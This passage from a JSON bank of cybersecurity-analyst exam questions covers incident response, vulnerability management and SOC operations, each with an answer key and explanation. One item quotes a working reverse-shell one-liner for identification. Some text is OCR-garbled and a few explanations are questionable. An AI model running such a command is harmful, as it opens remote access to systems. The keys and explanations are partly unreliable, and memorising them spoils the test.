    "question": "Due to reports of unauthorized activity that was occurring on the internal network, an analyst is\nperforming a network discovery. The analyst runs an Nmap scan against a corporate network to\nevaluate which devices were operating in the environment. Given the following output:\nWhich of the following choices should the analyst look at first?",
    "options": [
      "A. wh4dc-748gy.lan (192.168.86.152)",
      "B. lan (192.168.86.22)",
      "C. imaging.lan (192.168.86.150)",
      "D. xlaptop.lan (192.168.86.249)",
      "E. p4wnp1_aloa.lan (192.168.86.56)"
    ],
    "answer": "E",
    "explanation": "The analyst should look at p4wnp1_aloa.lan (192.168.86.56) first, as this is the most suspicious\ndevice on the network. P4wnP1 ALOA is a tool that can be used to create a malicious USB device that\ncan perform various attacks, such as keystroke injection, network sniffing, man-in-the-middle, or\nbackdoor creation. The presence of a device with this name on the network could indicate that an\nattacker has plugged in a malicious USB device to a system and gained access to the network. Official\nReference: https://github.com/mame82/P4wnP1_aloa",
    "image": "images/page_18_img_2.jpeg"
  },
  {
    "id": "q-jc-31",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "When starting an investigation, which of the following must be done first?",
    "options": [
      "A. Notify law enforcement",
      "B. Secure the scene",
      "C. Seize all related evidence",
      "D. Interview the witnesses"
    ],
    "answer": "B",
    "explanation": "The first thing that must be done when starting an investigation is to secure the scene. Securing the\nscene involves isolating and protecting the area where the incident occurred, as well as any potential\nevidence or witnesses. Securing the scene can help prevent any tampering, contamination, or\ndestruction of evidence, as well as any interference or obstruction of the investigation.",
    "image": null
  },
  {
    "id": "q-jc-32",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following describes how a CSIRT lead determines who should be communicated with\nand when during a security incident?",
    "options": [
      "A. The lead should review what is documented in the incident response policy or plan",
      "B. Management level members of the CSIRT should make that decision",
      "C. The lead has the authority to decide who to communicate with at any t me",
      "D. Subject matter experts on the team should communicate with others within the specified area of\nexpertise"
    ],
    "answer": "A",
    "explanation": "The incident response policy or plan is a document that defines the roles and responsibilities,\nprocedures and processes, communication and escalation protocols, and reporting and\ndocumentation requirements for handling security incidents. The lead should review what is\ndocumented in the incident response policy or plan to determine who should be communicated with\nand when during a security incident, as well as what information should be shared and how. The\nincident response policy or plan should also be aligned with the organizational policies and legal\nobligations regarding incident notification and disclosure.",
    "image": null
  },
  {
    "id": "q-jc-33",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A new cybersecurity analyst is tasked with creating an executive briefing on possible threats to the\norganization. Which of the following will produce the data needed for the briefing?",
    "options": [
      "A. Firewall logs",
      "B. Indicators of compromise",
      "C. Risk assessment",
      "D. Access control lists"
    ],
    "answer": "B",
    "explanation": "Indicators of compromise (IoCs) are pieces of data or evidence that suggest a system or network has\nbeen compromised by an attacker or malware. IoCs can include IP addresses, domain names, URLs,\nfile hashes, registry keys, network traffic patterns, user behaviors, or system anomalies. IoCs can be\nused to detect, analyze, and respond to security incidents, as well as to share threat intelligence with\nother organizations or authorities. IoCs can produce the data needed for an executive briefing on\npossible threats to the organization, as they can provide information on the source, nature, scope,\nimpact, and mitigation of the threats.",
    "image": null
  },
  {
    "id": "q-jc-34",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst notices there is an internal device sending HTTPS traffic with additional characters in the\nheader to a known-malicious IP in another country. Which of the following describes what the\nanalyst has noticed?",
    "options": [
      "A. Beaconing",
      "B. Cross-site scripting",
      "C. Buffer overflow",
      "D. PHP traversal"
    ],
    "answer": "A",
    "explanation": "Beaconing (A) is the correct answer. This describes malware installed on the internal device that periodically communicates with a Command-and-Control (C2) server at the known-malicious IP address using HTTPS to blend with legitimate traffic. The 'additional characters in the header' are a signature of C2 beacon traffic — malware often uses custom HTTP/HTTPS headers or padding to pass encoded instructions through firewalls. Cross-site scripting (B) involves injecting scripts into web pages. Buffer overflow (C) is a memory exploitation technique. PHP traversal (D) is a directory traversal attack — none of these match the outbound communication pattern described.",
    "image": null
  },
  {
    "id": "q-jc-35",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst is reviewing a packet capture in Wireshark that contains an FTP session from a\npotentially compromised machine. The analyst sets the following display filter: ftp. The analyst can\nsee there are several RETR requests with 226 Transfer complete responses, but the packet list pane is\nnot showing the packets containing the file transfer itself. Which of the following can the analyst\nperform to see the entire contents of the downloaded files?",
    "options": [
      "A. Change the display filter to f cp. accive. pore",
      "B. Change the display filter to tcg.port=20",
      "C. Change the display filter to f cp-daca and follow the TCP streams",
      "D. Navigate to the File menu and select FTP from the Export objects option"
    ],
    "answer": "C",
    "explanation": "The best way to see the entire contents of the downloaded files in Wireshark is to change the display\nfilter to ftp-data and follow the TCP streams. FTP-data is a protocol that is used to transfer files\nbetween an FTP client and server using TCP port 20. By filtering for ftp-data packets and following\nthe TCP streams, the analyst can see the actual file data that was transferred during the FTP session",
    "image": null
  },
  {
    "id": "q-jc-36",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A SOC manager receives a phone call from an upset customer. The customer received a vulnerability\nreport two hours ago: but the report did not have a follow-up remediation response from an analyst.\nWhich of the following documents should the SOC manager review to ensure the team is meeting\nthe appropriate contractual obligations for the customer?",
    "options": [
      "A. SLA",
      "B. MOU",
      "C. NDA",
      "D. Limitation of liability"
    ],
    "answer": "A",
    "explanation": "SLA stands for service level agreement, which is a contract or document that defines the expectations\nand obligations between a service provider and a customer regarding the quality, availability,\nperformance, or scope of a service. An SLA may also specify the metrics, penalties, or remedies for\nmeasuring or ensuring compliance with the agreed service levels. An SLA can help the SOC manager\nreview if the team is meeting the appropriate contractual obligations for the customer, such as\nresponse time, resolution time, reporting frequency, or communication channels.",
    "image": null
  },
  {
    "id": "q-jc-37",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following phases of the Cyber Kill Chain involves the adversary attempting to establish\ncommunication with a successfully exploited target?",
    "options": [
      "A. Command and control",
      "B. Actions on objectives",
      "C. Exploitation",
      "D. Delivery"
    ],
    "answer": "A",
    "explanation": "Command and control (C2) is a phase of the Cyber Kill Chain that involves the adversary attempting\nto establish communication with a successfully exploited target. C2 enables the adversary to\nremotely control or manipulate the target system or network using various methods, such as\nmalware callbacks, backdoors, botnets, or covert channels. C2 allows the adversary to maintain\npersistence, exfiltrate data, execute commands, deliver payloads, or spread to other systems or\nnetworks.",
    "image": null
  },
  {
    "id": "q-jc-38",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company that has a geographically diverse workforce and dynamic IPs wants to implement a\nvulnerability scanning method with reduced network traffic. Which of the following would best meet\nthis requirement?",
    "options": [
      "A. External",
      "B. Agent-based",
      "C. Non-credentialed",
      "D. Credentialed"
    ],
    "answer": "B",
    "explanation": "Agent-based vulnerability scanning is a method that involves installing software agents on the target\nsystems or networks that can perform local scans and report the results to a central server or\nconsole. Agent-based vulnerability scanning can reduce network traffic, as the scans are performed\nlocally and only the results are transmitted over the network. Agent-based vulnerability scanning can\nalso provide more accurate and up-to-date results, as the agents can scan continuously or on-\ndemand, regardless of the system or network status or location.",
    "image": null
  },
  {
    "id": "q-jc-39",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst detects an exploit attempt containing the following command:\nsh -i >& /dev/udp/10.1.1.1/4821 0>$l\nWhich of the following is being attempted?",
    "options": [
      "A. RCE",
      "B. Reverse shell",
      "C. XSS",
      "D. SQL injection"
    ],
    "answer": "B",
    "explanation": "A reverse shell is a type of shell access that allows a remote user to execute commands on a target\nsystem or network by reversing the normal direction of communication. A reverse shell is usually\ncreated by running a malicious script or program on the target system that connects back to the\nremote user’s system and opens a shell session. A reverse shell can bypass firewalls or other security\ncontrols that block incoming connections, as it uses an outgoing connection initiated by the target\nsystem. In this case, the security analyst has detected an exploit attempt containing the following\ncommand:\nsh -i >& /dev/udp/10.1.1.1/4821 0>$l\nThis command is a shell script that creates a reverse shell connection from the target system to the\nremote user’s system at IP address 10.1.1.1 and port 4821 using UDP protocol.",
    "image": null
  },
  {
    "id": "q-jc-40",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An older CVE with a vulnerability score of 7.1 was elevated to a score of 9.8 due to a widely available\nexploit being used to deliver ransomware. Which of the following factors would an analyst most\nlikely communicate as the reason for this escalation?",
    "options": [
      "A. Scope",
      "B. Weaponization",
      "C. CVSS",
      "D. Asset value"
    ],
    "answer": "B",
    "explanation": "Weaponization is a factor that describes how an adversary develops or acquires an exploit or payload\nthat can take advantage of a vulnerability and deliver a malicious effect. Weaponization can increase\nthe severity or impact of a vulnerability, as it makes it easier or more likely for an attacker to exploit\nit successfully and cause damage or harm. Weaponization can also indicate the level of sophistication\nor motivation of an attacker, as well as the availability or popularity of an exploit or payload in the\ncyber threat landscape. In this case, an older CVE with a vulnerability score of 7.1 was elevated to a\nscore of 9.8 due to a widely available exploit being used to deliver ransomware. This indicates that\nweaponization was the reason for this escalation.",
    "image": "images/page_24_img_2.jpeg"
  },
  {
    "id": "q-jc-41",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst is reviewing a vulnerability report for a server environment with the following entries:\nWhich of the following systems should be prioritized for patching first?",
    "options": [
      "A. 10.101.27.98",
      "B. 54.73.225.17",
      "C. 54.74.110.26",
      "D. 54.74.110.228"
    ],
    "answer": "D",
    "explanation": "The system that should be prioritized for patching first is 54.74.110.228, as it has the highest number\nand severity of vulnerabilities among the four systems listed in the vulnerability report. According to\nthe report, this system has 12 vulnerabilities, with 8 critical, 3 high, and 1 medium severity ratings.\nThe critical vulnerabilities include CVE-2019-0708 (BlueKeep), CVE-2019-1182 (DejaBlue), CVE-2017-\n0144 (EternalBlue), and CVE-2017-0145 (EternalRomance), which are all remote code execution\nvulnerabilities that can allow an attacker to compromise the system without any user interaction or\nauthentication. These vulnerabilities pose a high risk to the system and should be patched as soon as\npossible.",
    "image": "images/page_24_img_2.jpeg"
  },
  {
    "id": "q-jc-42",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company is in the process of implementing a vulnerability management program, and there are\nconcerns about granting the security team access to sensitive dat\na. Which of the following scanning methods can be implemented to reduce the access to systems\nwhile providing the most accurate vulnerability scan results?",
    "options": [
      "A. Credentialed network scanning",
      "B. Passive scanning",
      "C. Agent-based scanning",
      "D. Dynamic scanning"
    ],
    "answer": "C",
    "explanation": "Agent-based scanning is a method that involves installing software agents on the target systems or\nnetworks that can perform local scans and report the results to a central server or console. Agent-\nbased scanning can reduce the access to systems, as the agents do not require any credentials or\npermissions to scan the local system or network. Agent-based scanning can also provide the most\naccurate vulnerability scan results, as the agents can scan continuously or on-demand, regardless of\nthe system or network status or location.",
    "image": null
  },
  {
    "id": "q-jc-43",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst is trying to identify anomalies on the network routing. Which of the following\nfunctions can the analyst use on a shell script to achieve the objective most accurately?",
    "options": [
      "A. function x() { info=$(geoiplookup $1) && echo \"$1 | $info\" }",
      "B. function x() { info=$(ping -c 1 $1 | awk -F \"/\" ’END{print $5}’) && echo \"$1 | $info\" }",
      "C. function x() { info=$(dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F \".in-addr\" ’{print $1}\n').origin.asn.cymru.com TXT +short) && echo \"$1 | $info\" }",
      "D. function x() { info=$(traceroute -m 40 $1 | awk ‘END{print $1}’) && echo \"$1 | $info\" }"
    ],
    "answer": "C",
    "explanation": "The function that can be used on a shell script to identify anomalies on the network routing most\naccurately is:\nfunction x() { info=(dig(dig -x $1 | grep PTR | tail -n 1 | awk -F “.in-addr” ’{print $1}\n').origin.asn.cymru.com TXT +short) && echo “$1 | $info” }\nThis function takes an IP address as an argument and performs two DNS lookups using the dig\ncommand. The first lookup uses the -x option to perform a reverse DNS lookup and get the hostname\nassociated with the IP address. The second lookup uses the origin.asn.cymru.com domain to get the\nautonomous system number (ASN) and other information related to the IP address. The function\nthen prints the IP address and the ASN information, which can help identify any routing anomalies or\ninconsistencies",
    "image": null
  },
  {
    "id": "q-jc-44",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "There are several reports of sensitive information being disclosed via file sharing services. The\ncompany would like to improve its security posture against this threat. Which of the following\nsecurity controls would best support the company in this scenario?",
    "options": [
      "A. Implement step-up authentication for administrators",
      "B. Improve employee training and awareness",
      "C. Increase password complexity standards",
      "D. Deploy mobile device management"
    ],
    "answer": "B",
    "explanation": "The best security control to implement against sensitive information being disclosed via file sharing\nservices is to improve employee training and awareness. Employee training and awareness can help\neducate employees on the risks and consequences of using file sharing services for sensitive\ninformation, as well as the policies and procedures for handling such information securely and\nappropriately. Employee training and awareness can also help foster a security culture and\nencourage employees to report any incidents or violations of information security.",
    "image": null
  },
  {
    "id": "q-jc-45",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is the best way to begin preparation for a report titled \"What We Learned\"\nregarding a recent incident involving a cybersecurity breach?",
    "options": [
      "A. Determine the sophistication of the audience that the report is meant for",
      "B. Include references and sources of information on the first page",
      "C. Include a table of contents outlining the entire report",
      "D. Decide on the color scheme that will effectively communicate the metrics"
    ],
    "answer": "A",
    "explanation": "The best way to begin preparation for a report titled “What We Learned” regarding a recent incident\ninvolving a cybersecurity breach is to determine the sophistication of the audience that the report is\nmeant for. The sophistication of the audience refers to their level of technical knowledge,\nunderstanding, or interest in cybersecurity topics. Determining the sophistication of the audience\ncan help tailor the report content, language, tone, and format to suit their needs and expectations.\nFor example, a report for executive management may be more concise, high-level, and business-\noriented than a report for technical staff or peers.",
    "image": null
  },
  {
    "id": "q-jc-46",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst is performing an investigation involving multiple targeted Windows malware\nbinaries. The analyst wants to gather intelligence without disclosing information to the attackers.\nWhich of the following actions would allow the analyst to achieve the objective?",
    "options": [
      "A. Upload the binary to an air gapped sandbox for analysis",
      "B. Send the binaries to the antivirus vendor",
      "C. Execute the binaries on an environment with internet connectivity",
      "D. Query the file hashes using VirusTotal"
    ],
    "answer": "A",
    "explanation": "The best action that would allow the analyst to gather intelligence without disclosing information to\nthe attackers is to upload the binary to an air gapped sandbox for analysis. An air gapped sandbox is\nan isolated environment that has no connection to any external network or system. Uploading the\nbinary to an air gapped sandbox can prevent any communication or interaction between the binary\nand the attackers, as well as any potential harm or infection to other systems or networks. An air\ngapped sandbox can also allow the analyst to safely analyze and observe the behavior, functionality,\nor characteristics of the binary.",
    "image": null
  },
  {
    "id": "q-jc-47",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following would help to minimize human engagement and aid in process improvement\nin security operations?",
    "options": [
      "A. OSSTMM",
      "B. SIEM",
      "C. SOAR",
      "D. QVVASP"
    ],
    "answer": "C",
    "explanation": "SOAR stands for security orchestration, automation, and response, which is a term that describes a\nset of tools, technologies, or platforms that can help streamline, standardize, and automate security\noperations and incident response processes and tasks. SOAR can help minimize human engagement\nand aid in process improvement in security operations by reducing manual work, human errors,\nresponse time, or complexity. SOAR can also help enhance collaboration, coordination, efficiency, or\neffectiveness of security operations and incident response teams.",
    "image": null
  },
  {
    "id": "q-jc-48",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "After conducting a cybersecurity risk assessment for a new software request, a Chief Information\nSecurity Officer (CISO) decided the risk score would be too high. The CISO refused the software\nrequest. Which of the following risk management principles did the CISO select?",
    "options": [
      "A. Avoid",
      "B. Transfer",
      "C. Accept",
      "D. Mitigate"
    ],
    "answer": "A",
    "explanation": "Avoid is a risk management principle that describes the decision or action of not engaging in an\nactivity or accepting a risk that is deemed too high or unacceptable. Avoiding a risk can eliminate the\npossibility or impact of the risk, as well as the need for any further risk management actions. In this\ncase, the CISO decided the risk score would be too high and refused the software request. This\nindicates that the CISO selected the avoid principle for risk management.",
    "image": null
  },
  {
    "id": "q-jc-49",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is an important aspect that should be included in the lessons-learned step\nafter an incident?",
    "options": [
      "A. Identify any improvements or changes in the incident response plan or procedures",
      "B. Determine if an internal mistake was made and who did it so they do not repeat the error",
      "C. Present all legal evidence collected and turn it over to iaw enforcement",
      "D. Discuss the financial impact of the incident to determine if security controls are well spent"
    ],
    "answer": "A",
    "explanation": "An important aspect that should be included in the lessons-learned step after an incident is to\nidentify any improvements or changes in the incident response plan or procedures. The lessons-\nlearned step is a process that involves reviewing and evaluating the incident response activities and\noutcomes, as well as identifying and documenting any strengths, weaknesses, gaps, or best practices.\nIdentifying any improvements or changes in the incident response plan or procedures can help\nenhance the security posture, readiness, or capability of the organization for future incidents",
    "image": null
  },
  {
    "id": "q-jc-50",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "The security operations team is required to consolidate several threat intelligence feeds due to\nredundant tools and portals. Which of the following will best achieve the goal and maximize results?",
    "options": [
      "A. Single pane of glass",
      "B. Single sign-on",
      "C. Data enrichment",
      "D. Deduplication"
    ],
    "answer": "D",
    "explanation": "Deduplication is a process that involves removing any duplicate or redundant data or information\nfrom a data set or source. Deduplication can help consolidate several threat intelligence feeds by\neliminating any overlapping or repeated indicators of compromise (IoCs), alerts, reports, or\nrecommendations. Deduplication can also help reduce the volume and complexity of threat\nintelligence data, as well as improve its quality, accuracy, or relevance.",
    "image": null
  },
  {
    "id": "q-jc-51",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following would a security analyst most likely use to compare TTPs between different\nknown adversaries of an organization?",
    "options": [
      "A. MITRE ATTACK",
      "B. Cyber Kill Cham",
      "C. OWASP",
      "D. STIXTAXII"
    ],
    "answer": "A",
    "explanation": "MITRE ATT&CK is a framework and knowledge base that describes the tactics, techniques, and\nprocedures (TTPs) used by various adversaries in cyberattacks. MITRE ATT&CK can help security\nanalysts compare TTPs between different known adversaries of an organization, as well as identify\npatterns, gaps, or trends in adversary behavior. MITRE ATT&CK can also help security analysts\nimprove threat detection, analysis, and response capabilities, as well as share threat intelligence\nwith other organizations or communities",
    "image": null
  },
  {
    "id": "q-jc-52",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst is remediating items associated with a recent incident. The analyst has isolated the\nvulnerability and is actively removing it from the system. Which of the following steps of the process\ndoes this describe?",
    "options": [
      "A. Eradication",
      "B. Recovery",
      "C. Containment",
      "D. Preparation"
    ],
    "answer": "A",
    "explanation": "Eradication is a step in the incident response process that involves removing any traces or remnants\nof the incident from the affected systems or networks, such as malware, backdoors, compromised\naccounts, or malicious files. Eradication also involves restoring the systems or networks to their\nnormal or secure state, as well as verifying that the incident is completely eliminated and cannot\nrecur. In this case, the analyst is remediating items associated with a recent incident by isolating the\nvulnerability and actively removing it from the system. This describes the eradication step of the\nincident response process.",
    "image": null
  },
  {
    "id": "q-jc-53",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Joe, a leading sales person at an organization, has announced on social media that he is leaving his\ncurrent role to start a new company that will compete with his current employer. Joe is soliciting his\ncurrent employer's customers. However, Joe has not resigned or discussed this with his current\nsupervisor yet. Which of the following would be the best action for the incident response team to\nrecommend?",
    "options": [
      "A. Isolate Joe's PC from the network",
      "B. Reimage the PC based on standard operating procedures",
      "C. Initiate a remote wipe of Joe's PC using mobile device management",
      "D. Perform no action until HR or legal counsel advises on next steps"
    ],
    "answer": "D",
    "explanation": "The best action for the incident response team to recommend in this scenario is to perform no action\nuntil HR or legal counsel advises on next steps. This action can help avoid any potential legal or\nethical issues, such as violating employee privacy rights, contractual obligations, or organizational\npolicies. This action can also help ensure that any evidence or information collected from the\nemployee’s system or network is admissible and valid in case of any legal action or dispute. The\nincident response team should consult with HR or legal counsel before taking any action that may\naffect the employee’s system or network.",
    "image": null
  },
  {
    "id": "q-jc-54",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "The Chief Information Security Officer is directing a new program to reduce attack surface risks and\nthreats as part of a zero trust approach. The IT security team is required to come up with priorities\nfor the program. Which of the following is the best priority based on common attack frameworks?",
    "options": [
      "A. Reduce the administrator and privileged access accounts",
      "B. Employ a network-based IDS",
      "C. Conduct thorough incident response",
      "D. Enable SSO to enterprise applications"
    ],
    "answer": "A",
    "explanation": "The best priority based on common attack frameworks for a new program to reduce attack surface\nrisks and threats as part of a zero trust approach is to reduce the administrator and privileged access\naccounts. Administrator and privileged access accounts are accounts that have elevated permissions\nor capabilities to perform sensitive or critical tasks on systems or networks, such as installing\nsoftware, changing configurations, accessing data, or granting access. Reducing the administrator\nand privileged access accounts can help minimize the attack surface, as it can limit the number of\npotential targets or entry points for attackers, as well as reduce the impact or damage of an attack if\nan account is compromised.",
    "image": null
  },
  {
    "id": "q-jc-55",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "During an extended holiday break, a company suffered a security incident. This information was\nproperly relayed to appropriate personnel in a timely manner and the server was up to date and\nconfigured with appropriate auditing and logging. The Chief Information Security Officer wants to\nfind out precisely what happened. Which of the following actions should the analyst take first?",
    "options": [
      "A. Clone the virtual server for forensic analysis",
      "B. Log in to the affected server and begin analysis of the logs",
      "C. Restore from the last known-good backup to confirm there was no loss of connectivity",
      "D. Shut down the affected server immediately"
    ],
    "answer": "A",
    "explanation": "The first action that the analyst should take in this case is to clone the virtual server for forensic\nanalysis. Cloning the virtual server involves creating an exact copy or image of the server’s data and\nstate at a specific point in time. Cloning the virtual server can help preserve and protect any evidence\nor information related to the security incident, as well as prevent any tampering, contamination, or\ndestruction of evidence. Cloning the virtual server can also allow the analyst to safely analyze and\ninvestigate the incident without affecting the original server or its operations.",
    "image": null
  },
  {
    "id": "q-jc-56",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A systems administrator is reviewing after-hours traffic flows from data-center servers and sees\nregular outgoing HTTPS connections from one of the servers to a public IP address. The server should\nnot be making outgoing connections after hours. Looking closer, the administrator sees this traffic\npattern around the clock during work hours as well. Which of the following is the most likely\nexplanation?",
    "options": [
      "A. C2 beaconing activity",
      "B. Data exfiltration",
      "C. Anomalous activity on unexpected ports",
      "D. Network host IP address scanning",
      "E. A rogue network device"
    ],
    "answer": "A",
    "explanation": "The most likely explanation for this traffic pattern is C2 beaconing activity. C2 stands for command\nand control, which is a phase of the Cyber Kill Chain that involves the adversary attempting to\nestablish communication with a successfully exploited target. C2 beaconing activity is a type of\nnetwork traffic that indicates a compromised system is sending periodic messages or signals to an\nattacker’s system using various protocols, such as HTTP(S), DNS, ICMP, or UDP. C2 beaconing activity\ncan enable the attacker to remotely control or manipulate the target system or network using various\nmethods, such as malware callbacks, backdoors, botnets, or covert channels.",
    "image": null
  },
  {
    "id": "q-jc-57",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "New employees in an organization have been consistently plugging in personal webcams despite the\ncompany policy prohibiting use of personal devices. The SOC manager discovers that new employees\nare not aware of the company policy. Which of the following will the SOC manager most likely\nrecommend to help ensure new employees are accountable for following the company policy?",
    "options": [
      "A. Human resources must email a copy of a user agreement to all new employees",
      "B. Supervisors must get verbal confirmation from new employees indicating they have read the user\nagreement",
      "C. All new employees must take a test about the company security policy during the cjitoardmg\nprocess",
      "D. All new employees must sign a user agreement to acknowledge the company security policy"
    ],
    "answer": "D",
    "explanation": "The best action that the SOC manager can recommend to help ensure new employees are\naccountable for following the company policy is to require all new employees to sign a user\nagreement to acknowledge the company security policy. A user agreement is a document that\ndefines the rights and responsibilities of the users regarding the use of the company’s systems,\nnetworks, or resources, as well as the consequences of violating the company’s security policy.\nSigning a user agreement can help ensure new employees are aware of and agree to comply with the\ncompany security policy, as well as hold them accountable for any breaches or incidents caused by\ntheir actions or inactions.",
    "image": "images/page_33_img_2.jpeg"
  },
  {
    "id": "q-jc-58",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An analyst has been asked to validate the potential risk of a new ransomware campaign that the\nChief Financial Officer read about in the newspaper. The company is a manufacturer of a very small\nspring used in the newest fighter jet and is a critical piece of the supply chain for this aircraft. Which\nof the following would be the best threat intelligence source to learn about this new campaign?",
    "options": [
      "A. Information sharing organization",
      "B. Blogs/forums",
      "C. Cybersecuritv incident response team",
      "D. Deep/dark web"
    ],
    "answer": "A",
    "explanation": "An information sharing organization is a group or network of organizations that share threat\nintelligence, best practices, or lessons learned related to cybersecurity issues or incidents. An\ninformation sharing organization can help security analysts learn about new ransomware campaigns\nor other emerging threats, as well as get recommendations or guidance on how to prevent, detect,\nor respond to them. An information sharing organization can also help security analysts collaborate\nor coordinate with other organizations in the same industry or region that may face similar threats or\nchallenges.",
    "image": "images/page_33_img_2.jpeg"
  },
  {
    "id": "q-jc-59",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An incident response team finished responding to a significant security incident. The management\nteam has asked the lead analyst to provide an after-action report that includes lessons learned.\nWhich of the following is the most likely reason to include lessons learned?",
    "options": [
      "A. To satisfy regulatory requirements for incident reporting",
      "B. To hold other departments accountable",
      "C. To identify areas of improvement in the incident response process",
      "D. To highlight the notable practices of the organization's incident response team"
    ],
    "answer": "C",
    "explanation": "The most likely reason to include lessons learned in an after-action report is to identify areas of\nimprovement in the incident response process. The lessons learned process is a way of reviewing and\nevaluating the incident response activities and outcomes, as well as identifying and documenting any\nstrengths, weaknesses, gaps, or best practices. Identifying areas of improvement in the incident\nresponse process can help enhance the security posture, readiness, or capability of the organization\nfor future incidents, as well as provide feedback or recommendations on how to address any issues\nor challenges.",
    "image": "images/page_33_img_2.jpeg"
  },
  {
    "id": "q-jc-60",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A vulnerability management team is unable to patch all vulnerabilities found during their weekly\nscans. Using the third-party scoring system described below, the team patches the most urgent\nvulnerabilities:\nAdditionally, the vulnerability management team feels that the metrics Smear and Channing are less\nimportant than the others, so these will be lower in priority. Which of the following vulnerabilities\nshould be patched first, given the above third-party scoring system?",
    "options": [
      "A. InLoud:\nCobain: Yes\nGrohl: No\nNovo: Yes\nSmear: Yes\nChanning: No",
      "B. TSpirit:\nCobain: Yes\nGrohl: Yes\nNovo: Yes\nSmear: No\nChanning: No",
      "C. ENameless:\nCobain: Yes\nGrohl: No\nNovo: Yes\nSmear: No\nChanning: No",
      "D. PBleach:\nCobain: Yes\nGrohl: No\nNovo: No\nSmear: No\nChanning: Yes"
    ],
    "answer": "B",
    "explanation": "The vulnerability that should be patched first, given the above third-party scoring system, is:\nTSpirit: Cobain: Yes Grohl: Yes Novo: Yes Smear: No Channing: No\nThis vulnerability has three out of five metrics marked as Yes, which indicates a high severity level.\nThe metrics Cobain, Grohl, and Novo are more important than Smear and Channing, according to the\nvulnerability management team. Therefore, this vulnerability poses a greater risk than the other\nvulnerabilities and should be patched first.",
    "image": "images/page_33_img_2.jpeg"
  },
  {
    "id": "q-jc-61",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A user downloads software that contains malware onto a computer that eventually infects numerous\nother systems. Which of the following has the user become?",
    "options": [
      "A. Hacklivist",
      "B. Advanced persistent threat",
      "C. Insider threat",
      "D. Script kiddie"
    ],
    "answer": "C",
    "explanation": "The user has become an insider threat by downloading software that contains malware onto a\ncomputer that eventually infects numerous other systems. An insider threat is a person or entity that\nhas legitimate access to an organization’s systems, networks, or resources and uses that access to\ncause harm or damage to the organization. An insider threat can be intentional or unintentional,\nmalicious or negligent, and can result from various actions or behaviors, such as downloading\nunauthorized software, violating security policies, stealing data, sabotaging systems, or collaborating\nwith external attackers.",
    "image": null
  },
  {
    "id": "q-jc-62",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An organization has activated the CSIRT. A security analyst believes a single virtual server was\ncompromised and immediately isolated from the network. Which of the following should the CSIRT\nconduct next?",
    "options": [
      "A. Take a snapshot of the compromised server and verify its integrity",
      "B. Restore the affected server to remove any malware",
      "C. Contact the appropriate government agency to investigate",
      "D. Research the malware strain to perform attribution"
    ],
    "answer": "A",
